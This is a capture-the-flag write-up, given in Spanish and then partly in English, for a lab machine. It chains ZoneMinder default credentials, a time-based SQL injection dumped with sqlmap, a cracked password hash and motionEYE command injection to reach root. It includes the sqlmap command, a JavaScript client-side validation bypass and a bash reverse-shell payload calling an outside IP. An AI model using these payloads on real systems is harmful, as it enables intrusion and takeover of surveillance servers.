Resumen de Explotación

La máquina expone un panel de login de ZoneMinder en el puerto 80. Tras acceder con las credenciales por defecto admin:admin, identificamos la versión 1.37.63 y explotamos una inyección SQL basada en tiempo (GHSA-qm8h-3xvf-m7j3) en el parámetro tid, volcando la tabla de usuarios con sqlmap. El hash del usuario mark se crackea con éxito, revelando la contraseña opensesame, que sirve para acceder por SSH.

Una vez dentro como mark, inspeccionamos servicios internos y encontramos un panel de motionEYE 0.43.1b4 en el puerto 8765, cuyas credenciales de administración están en texto claro en /etc/motioneye/motion.conf. Esta versión de motionEYE es vulnerable a RCE sin sanitización del campo de nombre de archivo (GHSA-j945-qm58-4gjx). Saltando la validación del frontend con un override de JavaScript, inyectamos una reverse shell en el parámetro vulnerable y recibimos una shell directamente como root.

Tecnologías/Exploits: ZoneMinder SQLi autenticada basada en tiempo (GHSA-qm8h-3xvf-m7j3), crackeo de hash bcrypt, motionEYE RCE por inyección en campo de configuración sin sanitizar (GHSA-j945-qm58-4gjx).

El escaneo revela SSH en el puerto 22 y un servidor web Apache en el puerto 80 que redirige a cctv.htb. Añado el dominio al /etc/hosts y navego a la web.

Enumeración web — ZoneMinder

La página principal es una web sin mucho interés, pero hay un botón de Staff login en la parte superior derecha que lleva al panel de login de ZoneMinder en http://cctv.htb/zm/. ZoneMinder es un software open source de videovigilancia.

En el panel de login no se muestra la versión directamente, pero visitando http://cctv.htb/zm/api/ obtengo una página de error 404 de CakePHP que sí la expone: CakePHP 2.10.24. Revisando el historial de releases de ZoneMinder, esta versión de CakePHP se introdujo en la versión 1.34.24, por lo que sé que la instalación tiene como mínimo esa versión.

Pruebo algunos CVEs conocidos para versiones sin autenticar, pero ninguno funciona. Entonces pruebo las credenciales por defecto admin:admin y accedo sin problemas. Una vez dentro, el panel de administración confirma la versión exacta: ZoneMinder 1.37.63.

Investigación de vulnerabilidades — SQLi autenticada en ZoneMinder

Con la sesión activa, busco exploits aplicables a esta versión autenticada. Pruebo primero un CVE de RCE por inyección de comandos (GHSA-mjp3-8hg2-3f95), pero al visitar la URL vulnerable me redirige — parece protegido de alguna manera.

Sin embargo, encuentro una inyección SQL autenticada que sí funciona: GHSA-qm8h-3xvf-m7j3. El parámetro tid en la siguiente URL es vulnerable:

http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1

Añadir una comilla simple (') al valor del parámetro provoca un error 500, confirmando la inyección. Aunque el advisory menciona una SQLi booleana, en la práctica la time-based es la que da resultados con sqlmap. Lanzo el volcado pasando la cookie de sesión activa:

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
  -D zm -T Users -C Username,Password \
  --dump --batch --dbms=mysql \
  -H "Cookie: ZMSESSID=2uj56p7fnjdap9r3q1sl3a8jpd" \
  --threads=10

El volcado tarda un rato (es time-based), pero finalmente obtengo dos usuarios de la tabla Users:

| Username   | Password                                                     |

| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |

Escalada de privilegios — RCE en motionEYE

Para la versión 0.43.1b4 de motionEYE existe un CVE de ejecución remota de código: GHSA-j945-qm58-4gjx. La vulnerabilidad reside en que el campo de nombre de archivo en la configuración de grabación no se sanitiza correctamente más allá de una validación en el frontend, por lo que se pueden inyectar subcomandos de shell directamente en ese campo.

En el panel encuentro ya una cámara registrada, así que pruebo la PoC del advisory directamente en sus ajustes:

Como es de esperar, al intentar guardar el frontend lanza un error de validación:

Pero esta validación únicamente existe en el lado del cliente. La puedo saltarme abriendo la consola de JavaScript del navegador y sobreescribiendo la función de validación:

configUiValid = function() { return true; };

Con ese override activo, aplico los cambios sin problemas. Para verificar que tenemos ejecución como root, uso la PoC original del advisory (crear un archivo de prueba) y compruebo el resultado en el sistema:

-rw-r--r-- 1 root root 0 Mar 8 15:00 test

El archivo se ha creado como root. Esto confirma que el proceso de motionEYE se ejecuta con privilegios de root y que tenemos inyección de comandos plena. Sustituyo el payload de prueba por una reverse shell:

$(bash -c "bash -i >& /dev/tcp/10.10.16.137/443 0>&1").%Y-%m-%d-%H-%M-%S

Tras aplicar los cambios con el override de JavaScript activo, a los pocos segundos recibo la conexión en mi listener:

Exploitation Summary

The machine exposes a ZoneMinder login panel on port 80. After gaining access with the default credentials admin:admin, we identify version 1.37.63 and exploit an authenticated time-based SQL injection (GHSA-qm8h-3xvf-m7j3) on the tid parameter, dumping the users table with sqlmap. The hash for user mark is cracked successfully, revealing the password opensesame, which grants SSH access.

Once inside as mark, we enumerate internal services and find a motionEYE 0.43.1b4 panel on port 8765, whose admin credentials are stored in plaintext in /etc/motioneye/motion.conf. This version of motionEYE is vulnerable to RCE due to unsanitized input in the filename configuration field (GHSA-j945-qm58-4gjx). By overriding the frontend validation with a JavaScript console trick, we inject a reverse shell into the vulnerable field and receive a shell directly as root.

Technologies/Exploits: ZoneMinder authenticated time-based SQLi (GHSA-qm8h-3xvf-m7j3), bcrypt hash cracking, motionEYE RCE via unsanitized configuration field injection (GHSA-j945-qm58-4gjx).

Vulnerability Research — Authenticated SQLi in ZoneMinder

With an active session, I look for exploits targeting this authenticated version. I first try an authenticated RCE via command injection (GHSA-mjp3-8hg2-3f95), but the vulnerable URL redirects me — it appears to be patched or otherwise protected.

Privilege Escalation — RCE via motionEYE

Version 0.43.1b4 of motionEYE is affected by an RCE vulnerability: GHSA-j945-qm58-4gjx. The root cause is that the filename field in the recording configuration is not sanitized on the server side — only a frontend JavaScript check prevents malicious input, which can be trivially bypassed. Shell subcommands injected into the filename are executed directly by the underlying motion process.

There is already a camera registered in the panel, so I test the advisory's PoC directly in its settings:

As expected, the frontend validation fires and blocks saving the configuration:

This check only exists on the client side. I bypass it by opening the browser's JavaScript console and overriding the validation function:

configUiValid = function() { return true; };

With the override in place, I apply the changes successfully. To confirm we have code execution as root, I first use the advisory's original PoC (create a test file) and verify on the system:

-rw-r--r-- 1 root root 0 Mar 8 15:00 test

The file was created as root, confirming that the motionEYE process runs with full root privileges. I replace the test payload with a reverse shell:

$(bash -c "bash -i >& /dev/tcp/10.10.16.137/443 0>&1").%Y-%m-%d-%H-%M-%S

After applying the changes again with the JavaScript override active, my listener catches the connection within seconds:
